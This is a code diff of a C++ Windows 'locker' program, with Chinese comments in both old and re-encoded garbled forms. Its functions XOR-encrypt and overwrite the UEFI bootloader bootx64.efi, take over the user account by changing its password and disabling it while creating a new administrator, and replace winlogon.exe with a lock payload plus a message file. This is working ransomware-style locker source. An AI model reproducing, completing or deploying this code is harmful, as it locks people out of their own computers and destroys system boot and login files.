@@ -1,6 +1,6 @@
 #include "Lock.h"
 #include <vector>
-/*Ó²ÅÌËø ÊÇÅàÓı*/
+/*ç¡¬ç›˜é” æ˜¯åŸ¹è‚²*/
 int DiskLock(LockCore locker)
 {
 	HANDLE DiskHandle = NULL;
@@ -8,42 +8,42 @@ int DiskLock(LockCore locker)
 	string boot = GetPartitiontype(DiskHandle);
 	if (boot == "GPT")
 	{
-		ofstream script("Esp.txt"); // ´´½¨Ò»¸öÎÄ¼şÓÃÓÚ´æ´¢½Å±¾
+		ofstream script("Esp.txt"); // åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨äºå­˜å‚¨è„šæœ¬
 		script << "select disk " << GetSystemDiskPhysicalNumber() << endl;
-		script << "select partition 1\n"; // Ñ¡ÔñESP·ÖÇø Ã»±ØÒªÔÙ»ñÈ¡Ò»´ÎÏµÍ³·ÖÇøºÅ£¬Ò»°ãÈË¶¼ÊÇ1
-		script << "assign letter=X\n"; // ½«ESP·ÖÇø¹ÒÔØµ½ÅÌ·ûX
-		script << "exit\n"; // ÍË³ödiskpart
-		script.close(); // ¹Ø±ÕÎÄ¼ş
-		system("diskpart /s Esp.txt"); // ÔËĞĞ½Å±¾
-        // ´ò¿ªbootx64.efiÎÄ¼ş
+		script << "select partition 1\n"; // é€‰æ‹©ESPåˆ†åŒº æ²¡å¿…è¦å†è·å–ä¸€æ¬¡ç³»ç»Ÿåˆ†åŒºå·ï¼Œä¸€èˆ¬äººéƒ½æ˜¯1
+		script << "assign letter=X\n"; // å°†ESPåˆ†åŒºæŒ‚è½½åˆ°ç›˜ç¬¦X
+		script << "exit\n"; // é€€å‡ºdiskpart
+		script.close(); // å…³é—­æ–‡ä»¶
+		system("diskpart /s Esp.txt"); // è¿è¡Œè„šæœ¬
+        // æ‰“å¼€bootx64.efiæ–‡ä»¶
         ifstream in("X:\\ESP\\BOOT\\bootx64.efi", ios::binary); 
         if (!in)
         {
-            cout << "ÎŞ·¨´ò¿ªÎÄ¼ş" << endl;
+            cout << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << endl;
             return -1;
         }
-        // ¶ÁÈ¡bootx64.efiÎÄ¼şµÄÄÚÈİ
+        // è¯»å–bootx64.efiæ–‡ä»¶çš„å†…å®¹
         vector<char> buffer((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
-        // ¶Ô¶ÁÈ¡µÄÄÚÈİ½øĞĞÒì»ò¼ÓÃÜ
+        // å¯¹è¯»å–çš„å†…å®¹è¿›è¡Œå¼‚æˆ–åŠ å¯†
         for (int i = 0; i < buffer.size(); i++)
         {
             buffer[i] ^= locker.Xorkey;
                 ;
         }
-        // ½«¼ÓÃÜºóµÄÄÚÈİĞ´Èëbootbackup.yeluoÎÄ¼ş
+        // å°†åŠ å¯†åçš„å†…å®¹å†™å…¥bootbackup.yeluoæ–‡ä»¶
         ofstream out("X:\\ESP\\BOOT\\bootbackup.yeluo", ios::binary);
         if (!out)
         {
-            cout << "ÎŞ·¨´´½¨ÎÄ¼ş" << endl;
+            cout << "æ— æ³•åˆ›å»ºæ–‡ä»¶" << endl;
             return -1;
         }
         out.write(&buffer[0], buffer.size());
 
-        // Çå¿Õbootx64.efiÎÄ¼ş²¢Ğ´ÈëĞÂÊı¾İ
+        // æ¸…ç©ºbootx64.efiæ–‡ä»¶å¹¶å†™å…¥æ–°æ•°æ®
         ofstream out2("X:\\ESP\\BOOT\\bootx64.efi", ios::binary | ios::trunc);
         if (!out2)
         {
-           // cout << "ÎŞ·¨´ò¿ªÎÄ¼ş" << endl;
+           // cout << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << endl;
             return -1;
         }
         out2.write(reinterpret_cast<char*>(locker.UefiLockCore), sizeof(locker.UefiLockCore));
@@ -53,91 +53,133 @@ int DiskLock(LockCore locker)
 
 	}
 }
-// ÓÃ»§Ëøº¯Êı£¬ÓÃÓÚ´´½¨Ò»¸öĞÂÓÃ»§²¢½ûÓÃµ±Ç°ÓÃ»§
-// ÊäÈë²ÎÊı£ºsetting - ÓÃ»§ËøÉèÖÃ
-// ·µ»ØÖµ£ºboolÀàĞÍ£¬±íÊ¾º¯ÊıµÄÖ´ĞĞ½á¹û
+// ç”¨æˆ·é”å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶ç¦ç”¨å½“å‰ç”¨æˆ·
+// è¾“å…¥å‚æ•°ï¼šsetting - ç”¨æˆ·é”è®¾ç½®
+// è¿”å›å€¼ï¼šboolç±»å‹ï¼Œè¡¨ç¤ºå‡½æ•°çš„æ‰§è¡Œç»“æœ
 BOOL UserLock( UserLockSetting setting)
 {
-    // »ñÈ¡µ±Ç°ÓÃ»§µÄÓÃ»§Ãû
+    // è·å–å½“å‰ç”¨æˆ·çš„ç”¨æˆ·å
     LPWSTR local = W_GetCurrentUsername();
 
-    // ¸ü¸Äµ±Ç°ÓÃ»§µÄÃÜÂë
+    // æ›´æ”¹å½“å‰ç”¨æˆ·çš„å¯†ç 
     if (!CurrentUser(local, setting.newPassword))
     {
-        // Èç¹û¸ü¸ÄÃÜÂëÊ§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
+        // å¦‚æœæ›´æ”¹å¯†ç å¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
         return false;
     }
 
-    // Èç¹ûĞèÒª¸ü¸ÄÔ­ÓÃ»§Ãû
+    // å¦‚æœéœ€è¦æ›´æ”¹åŸç”¨æˆ·å
     if (setting.changeOriginalUsername)
     {
-        // ¸ü¸Äµ±Ç°ÓÃ»§Ãû
+        // æ›´æ”¹å½“å‰ç”¨æˆ·å
         if (!RenameUserAccount(local, setting.newUsername))
         {
-            // Èç¹û¸ü¸ÄÓÃ»§ÃûÊ§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
+            // å¦‚æœæ›´æ”¹ç”¨æˆ·åå¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
             return false;
         }
     }
-    else // Èç¹û²»ĞèÒª¸ü¸ÄÔ­ÓÃ»§Ãû
+    else // å¦‚æœä¸éœ€è¦æ›´æ”¹åŸç”¨æˆ·å
     {
-        // ´´½¨Ò»¸öĞÂÓÃ»§£¬²¢½«ÆäÌí¼Óµ½¹ÜÀíÔ±×éÖĞ
-        // Í¬Ê±½ûÓÃµ±Ç°ÓÃ»§£¬Ê¹ÆäÎŞ·¨µÇÂ¼
+        // åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­
+        // åŒæ—¶ç¦ç”¨å½“å‰ç”¨æˆ·ï¼Œä½¿å…¶æ— æ³•ç™»å½•
         if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
         {
-            // Èç¹û´´½¨ÓÃ»§»ò½ûÓÃÓÃ»§Ê§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
+            // å¦‚æœåˆ›å»ºç”¨æˆ·æˆ–ç¦ç”¨ç”¨æˆ·å¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
             return false;
         }
     }
     return true;
 }
-/*¼ÓÃÜÎÄ¼şËø*/
+/*åŠ å¯†æ–‡ä»¶é”*/
 int FileLock(string password)
 {
 	return 0;
 }
-/*½Ù³ÖwinloginµÇÂ¼Ëø*/
-int LoginLock(LoginLockSetting setting )
+/*åŠ«æŒwinloginç™»å½•é”*/
+int LoginLock(LoginLockSetting setting)
 {
-    // ´ò¿ªÒª¶ÁÈ¡µÄÎÄ¼ş
-    std::ifstream in("C:\\Windows\\System32\\winlogon.exe", std::ios::binary);
-    if (!in)
+    // æ‰“å¼€è¦è¯»å–çš„æ–‡ä»¶
+    HANDLE hIn = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hIn == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "ÎŞ·¨´ò¿ªÎÄ¼ş" << std::endl;
+        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
         return -1;
     }
 
-    // ¶ÁÈ¡ÎÄ¼şÄÚÈİµ½»º³åÇø
-    std::vector<char> buffer(std::istreambuf_iterator<char>(in), {});
-    in.close();
+    // è·å–æ–‡ä»¶å¤§å°
+    DWORD dwFileSize = GetFileSize(hIn, NULL);
+    if (dwFileSize == INVALID_FILE_SIZE)
+    {
+        std::cerr << "æ— æ³•è·å–æ–‡ä»¶å¤§å°" << std::endl;
+        CloseHandle(hIn);
+        return -1;
+    }
 
-    // ¶Ô¶ÁÈ¡µÄÄÚÈİ½øĞĞÒì»ò¼ÓÃÜ
+    // è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒº
+    std::vector<char> buffer(dwFileSize);
+    DWORD dwBytesRead = 0;
+    if (!ReadFile(hIn, buffer.data(), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
+    {
+        std::cerr << "è¯»å–æ–‡ä»¶å¤±è´¥" << std::endl;
+        CloseHandle(hIn);
+        return -1;
+    }
+    CloseHandle(hIn);
+
+    // å¯¹è¯»å–çš„å†…å®¹è¿›è¡Œå¼‚æˆ–åŠ å¯†
     const char xorKey = setting.XorKey;
     for (char& c : buffer)
     {
         c ^= xorKey;
     }
 
-    // Ğ´Èë¼ÓÃÜºóµÄÊı¾İµ½ÎÄ¼ş
-    std::ofstream out("C:\\loginbackup.yeluo", std::ios::binary);
-    if (!out)
+    // å†™å…¥åŠ å¯†åçš„æ•°æ®åˆ°æ–‡ä»¶
+    HANDLE hOut = CreateFile(L"C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOut == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "ÎŞ·¨´´½¨ÎÄ¼ş" << std::endl;
+        std::cerr << "æ— æ³•åˆ›å»ºæ–‡ä»¶" << std::endl;
         return -1;
     }
-    out.write(buffer.data(), buffer.size());
-    out.close();
-    // Ğ´ÈëĞÂµÄÊı¾İµ½ÎÄ¼ş
-    std::ofstream out2("C:\\Windows\\System32\\winlogon.exe", std::ios::binary | std::ios::trunc);
-    if (!out2)
+    DWORD dwBytesWritten = 0;
+    if (!WriteFile(hOut, buffer.data(), dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
     {
-        std::cerr << "ÎŞ·¨´ò¿ªÎÄ¼ş" << std::endl;
+        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
+        CloseHandle(hOut);
         return -1;
     }
-    out2.write(reinterpret_cast<const char*>(setting.LockCore), sizeof(setting.LockCore));
-    out2.close();
-    // Ğ´ÈëĞÂµÄÏûÏ¢µ½ÎÄ¼ş
-    std::ofstream outFile("C:\\Windows\\System32\\msg.txt");
-    outFile << setting.ShowMsg;
-    outFile.close();
-    std::cout << "²Ù×÷Íê³É" << std::endl;
+    CloseHandle(hOut);
+
+    // å†™å…¥æ–°çš„æ•°æ®åˆ°æ–‡ä»¶
+    hOut = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOut == INVALID_HANDLE_VALUE)
+    {
+        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
+        return -1;
+    }
+    if (!WriteFile(hOut, setting.LockCore, sizeof(setting.LockCore), &dwBytesWritten, NULL) || dwBytesWritten != sizeof(setting.LockCore))
+    {
+        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
+        CloseHandle(hOut);
+        return -1;
+    }
+    CloseHandle(hOut);
+
+    // å†™å…¥æ–°çš„æ¶ˆæ¯åˆ°æ–‡ä»¶
+    hOut = CreateFile(L"C:\\Windows\\System32\\msg.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOut == INVALID_HANDLE_VALUE)
+    {
+        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
+        return -1;
+    }
+    DWORD dwMsgLen = (DWORD)wcslen(setting.ShowMsg) * sizeof(wchar_t);
+    if (!WriteFile(hOut, setting.ShowMsg, dwMsgLen, &dwBytesWritten, NULL) || dwBytesWritten != dwMsgLen)
+    {
+        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
+        CloseHandle(hOut);
+        return -1;
+    }
+    CloseHandle(hOut);
+
+    std::cout << "æ“ä½œå®Œæˆ" << std::endl;
+    return 0;
 }
